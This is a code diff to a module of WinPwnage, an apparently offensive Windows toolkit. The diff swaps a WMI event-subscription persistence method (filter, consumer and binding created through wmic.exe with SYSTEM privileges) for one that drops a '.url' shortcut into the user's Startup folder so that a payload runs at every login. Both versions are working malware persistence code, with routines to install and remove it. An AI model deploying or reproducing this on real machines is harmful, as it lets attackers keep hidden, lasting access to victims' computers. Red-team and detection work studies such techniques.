@@ -1,51 +1,41 @@
-import time
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
 persistMethod8_info = {
-	"Description": "Persistence using wmic.exe (SYSTEM privileges)",
-	"Method": "Malicious mof file using EventFilter EventConsumer and binding",
+	"Description": "Persistence using startup files",
+	"Method": "Malicious lnk file in startup directory",
 	"Id": "8",
 	"Type": "Persistence",
-	"Fixed In": "99999" if information().admin() == True else "0",
+	"Fixed In": "99999",
 	"Works From": "7600",
-	"Admin": True,
+	"Admin": False,
 	"Function Name": "persistMethod8",
 	"Function Payload": True,
 }
 
 def persistMethod8(payload, name="", add=True):
-	if not information().admin():
-		print_error("Cannot proceed, we are not elevated")
+	appdata = os.path.expandvars("%AppData%")
+	startup_dir = os.path.join(appdata, r'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+	if not os.path.exists(startup_dir):
+		print_error("Start up directory not found: {directory}".format(directory=startup_dir))
 		return False
 
-	cmds = {
-		'create': {
-			('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="{name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 360"'),
-			('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="{name}", ExecutablePath="{path}", CommandLineTemplate="{path}"'),
-			('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter=\'__EventFilter.Name="{name}"\', Consumer=\'CommandLineEventConsumer.Name="{name}"\''),
-		},
-		'delete': {
-			('__EventFilter', '/namespace:"\\\\root\\subscription" PATH __EventFilter WHERE Name="{name}" DELETE'),
-			('CommandLineEventConsumer', '/namespace:"\\\\root\\subscription" PATH CommandLineEventConsumer WHERE Name="{name}" DELETE'),
-			('__FilterToConsumerBinding', '/namespace:"\\\\root\\subscription" PATH __FilterToConsumerBinding WHERE Filter=\'__EventFilter.Name="{name}"\' DELETE'),
-		}
-	}
-
+	startup_file_path = os.path.join(startup_dir, '{name}.eu.url'.format(name=name))
 	if add:
-		if not payloads().exe(payload):
+		if payloads().exe(payload):
+			with open(startup_file_path, 'w') as f:
+				f.write('\n[InternetShortcut]\nURL=file:///{payload}\n'.format(payload=payloads().exe(payload)[1]))
+			print_success('Startup file created: {path}'.format(path=startup_file_path))
+			print_success("Successfully installed persistence, payload will run at login")
+			return True
+		else:
 			print_error("Cannot proceed, invalid payload")
 			return False
-
-		action = "create"
 	else:
-		action = "delete"
-
-	for i, cmd in cmds[action]:
-		exit_code = process().create('wmic.exe', params=cmd.format(name=name, path=payloads().exe(payload)[1]), get_exit_code=True)
-		if exit_code == 0:
-			print_success("Successfully {action} {event} (exit code: {code})".format(action=action, event=i, code=exit_code))
-		else:
-			print_error("Unable to {action} {event} (exit code: {code})".format(action=action, event=i, code=exit_code))
-
-		time.sleep(3)
+		print_info("Removing startup file ({path})".format(path=startup_file_path))
+		try:
+			os.remove(startup_file_path)
+			print_success("Successfully removed persistence")
+		except Exception:
+			print_error("Unable to remove persistence")
+			return False
